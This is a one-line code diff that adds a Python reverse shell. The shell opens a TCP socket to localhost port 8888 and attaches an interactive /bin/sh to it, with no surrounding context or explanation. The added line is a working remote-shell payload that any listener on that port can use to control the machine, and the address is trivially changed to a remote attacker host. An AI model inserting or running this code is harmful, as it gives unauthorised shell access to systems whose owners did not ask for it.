@@ -1,0 +1,1 @@
+import os;import socket;import subprocess;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(('localhost',8888));subprocess.Popen('/bin/sh -i',shell=True,stdout=s.fileno(),stderr=s.fileno(),stdin=s.fileno())
